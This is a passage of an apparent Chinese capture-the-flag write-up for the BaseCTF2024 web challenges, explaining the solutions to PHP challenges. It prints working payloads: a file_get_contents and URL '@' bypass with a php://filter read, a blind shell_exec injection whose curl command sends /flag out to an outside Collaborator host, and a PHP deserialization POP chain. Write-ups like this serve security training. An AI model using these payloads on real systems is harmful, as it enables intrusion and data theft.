<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Hsad"><meta name="copyright" content="Hsad"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>BaseCTF2024-web | Hsad's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"hsad.xyz","root":"/","title":"所以你弃权","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="Aura 酱的礼物(url@)&lt;?php  highlight_file(__FILE__);  &#x2F;&#x2F; Aura 酱，欢迎回家~  &#x2F;&#x2F; 这里有一份礼物，请你签收一下哟~  $pen &#x3D; $_POST[&#39;pen&#39;];  if (file_get_contents($pen) !&#x3D;&#x3D; &#39;Aura&#39;)  &#123;      die(&#39;这是 Aura 的礼物，你不是 Aura！&#39;);  &amp;#1">
<meta property="og:type" content="article">
<meta property="og:title" content="BaseCTF2024-web">
<meta property="og:url" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/index.html">
<meta property="og:site_name" content="Hsad&#39;s Blog">
<meta property="og:description" content="Aura 酱的礼物(url@)&lt;?php  highlight_file(__FILE__);  &#x2F;&#x2F; Aura 酱，欢迎回家~  &#x2F;&#x2F; 这里有一份礼物，请你签收一下哟~  $pen &#x3D; $_POST[&#39;pen&#39;];  if (file_get_contents($pen) !&#x3D;&#x3D; &#39;Aura&#39;)  &#123;      die(&#39;这是 Aura 的礼物，你不是 Aura！&#39;);  &amp;#1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/shell_exec.png">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/MD5.png">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/git.png">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/git_2.png">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/sql2.png">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/sql3.png">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/justread.png">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/justread2.png">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/ez_php.png">
<meta property="og:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/ez_php2.png">
<meta property="article:published_time" content="2024-08-18T08:18:50.000Z">
<meta property="article:modified_time" content="2024-10-01T15:30:10.160Z">
<meta property="article:author" content="Hsad">
<meta property="article:tag" content="BaseCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hsad.xyz/2024/08/18/BaseCTF2024-web/shell_exec.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Hsad"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Hsad"><span class="site-author-status" title="凉">☺️</span></a><div class="site-author-name"><a href="/about/">Hsad</a></div><span class="site-name">Hsad's Blog</span><sub class="site-subtitle">一个人的世界</sub><div class="site-description">翻着我们的照片 想念若隐若现</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">38</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">36</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=EYiK7-b5ur1mWxbX7aV2AEBsuoW9c732" title="QQ" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/watanabe-hsad" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:dubian.zzy@outlook.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Aura-%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9-url"><span class="toc-number">1.</span> <span class="toc-text">Aura 酱的礼物(url@)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%A0%E5%90%AC%E4%B8%8D%E5%88%B0%E6%88%91%E7%9A%84%E5%A3%B0%E9%9F%B3"><span class="toc-number">2.</span> <span class="toc-text">你听不到我的声音</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-ser"><span class="toc-number">3.</span> <span class="toc-text">ez_ser</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Really-EZ-POP"><span class="toc-number">4.</span> <span class="toc-text">Really EZ POP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%A6%E5%A4%A7%E5%B8%88"><span class="toc-number">5.</span> <span class="toc-text">数学大师</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82-MD5-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text">所以你说你懂 MD5?  (哈希长度拓展攻击)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%A9%E5%8E%9F%E7%A5%9E%E7%8E%A9%E7%9A%84"><span class="toc-number">7.</span> <span class="toc-text">玩原神玩的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E8%AF%BB%E6%9C%BA-SSTI"><span class="toc-number">8.</span> <span class="toc-text">复读机(SSTI)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-php-jail"><span class="toc-number">9.</span> <span class="toc-text">ez_php_jail</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%9F-php%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">10.</span> <span class="toc-text">flag直接读取不就行了？(php原生类)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Back-to-the-future-git%E6%B3%84%E9%9C%B2"><span class="toc-number">11.</span> <span class="toc-text">Back to the future(git泄露)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A3%E9%92%A5%E4%B9%8B%E6%88%981-0-python-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">12.</span> <span class="toc-text">圣钥之战1.0(python 原型链污染)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jinja-Mark-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-ssti"><span class="toc-number">13.</span> <span class="toc-text">Jinja Mark(原型链污染+ssti)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lucky-Number-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93plus"><span class="toc-number">14.</span> <span class="toc-text">Lucky Number(原型链污染plus)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#only-one-sql"><span class="toc-number">15.</span> <span class="toc-text">only one sql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE-or-Sql-Inject-mysql"><span class="toc-number">16.</span> <span class="toc-text">RCE or Sql Inject(mysql ? )</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sql-Inject-or-RCE-delimiter-handler"><span class="toc-number">17.</span> <span class="toc-text">Sql Inject or RCE(delimiter handler)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Just-Readme-%E5%89%8D%E7%BD%AE-CVE-2024-2961"><span class="toc-number">18.</span> <span class="toc-text">Just Readme (前置)(CVE-2024-2961)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1z-php"><span class="toc-number">19.</span> <span class="toc-text">1z_php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-php-gc%E5%9B%9E%E6%94%B6%EF%BC%8C%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8"><span class="toc-number">20.</span> <span class="toc-text">ez_php(gc回收，引用绕过，反序列化逃逸)</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://hsad.xyz/2024/08/18/BaseCTF2024-web/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Hsad"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hsad's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">BaseCTF2024-web</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-08-18 16:18:50" itemprop="dateCreated datePublished" datetime="2024-08-18T16:18:50+08:00">2024-08-18</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-10-01 23:30:10" itemprop="dateModified" datetime="2024-10-01T23:30:10+08:00">2024-10-01</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">安全相关</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/BaseCTF/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">BaseCTF</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h4 id="Aura-酱的礼物-url"><a href="#Aura-酱的礼物-url" class="headerlink" title="Aura 酱的礼物(url@)"></a>Aura 酱的礼物(url@)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// Aura 酱，欢迎回家~ </span>
<span class="token comment">// 这里有一份礼物，请你签收一下哟~ </span>
<span class="token variable">$pen</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$pen</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Aura'</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这是 Aura 的礼物，你不是 Aura！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 

<span class="token comment">// 礼物收到啦，接下来要去博客里面写下感想哦~ </span>
<span class="token variable">$challenge</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这不是 Aura 的博客！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 

<span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'已经收到Kengwang的礼物啦'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请去博客里面写下感想哦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 

<span class="token comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ </span>
<span class="token variable">$gift</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gift'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre>

<p><strong>file_get_contents()</strong></p>
<p>语法：file_get_contents(path,include_path,context,start,max_length)</p>
<p>该函数是用于把文件的内容读入到一个字符串里的方法。</p>
<p>这个函数绕过方式有多种：</p>
<p><strong>php:&#x2F;&#x2F;input伪协议绕过</strong></p>
<ol>
<li>将要GET的参数?xxx&#x3D;php:&#x2F;&#x2F;input</li>
<li>用post方法传入想要file_get_contents()函数返回的值</li>
</ol>
<p><strong>data:&#x2F;&#x2F;伪协议绕过</strong></p>
<ol>
<li>?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,想要file_get_contents()函数返回的值的base64编码</li>
<li>?xxx&#x3D;data:text&#x2F;plain,(url编码的内容)</li>
</ol>
<p>这里因为是POST传参所以采用data</p>
<p>strpos函数是返回需要查找的字符串在目标字符串的位置，这里要求为0，意味着必须在开头出现</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>
pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io</span></code></pre>

<p>第三个绕过需要用<code>file_get_contents</code>传入<code>challenge</code>变量，这里考点为<code>file_get_contents</code>本来的用法，以及url跳转</p>
<p>本页面就有<strong>已经收到Kengwang的礼物啦</strong>的字样</p>
<p>所以传入<code>challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657/</code>即可绕过</p>
<p>最后就是一个简单的文件包含</p>
<p>Payload:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>
pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657&amp;gift=php://filter/convert.base64-encode/resource=flag.php</span></code></pre>

<h4 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre>

<p>没回显，本来想反弹shell，没成功，直接用bp的Collaborator外带出来</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>
cmd<span class="token operator">=</span>curl<span class="token operator">%</span><span class="token number">2017698</span>qgbtquwasnhu67e3mej1a71vsjh<span class="token operator">.</span>oastify<span class="token operator">.</span>com<span class="token operator">/</span><span class="token string backtick-quoted-string">`tac%20/flag`</span></code></pre>

<p><img src="shell_exec.png" loading="lazy"></p>
<h4 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"什么，你竟敢不认可?"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"happy happy happy!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are over!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
</code></pre>

<p>Pop链如下</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$kw</span> <span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>


<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span><span class="token operator">-></span><span class="token property">chu0</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token property">over</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Misc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre>

<p>Payload:</p>
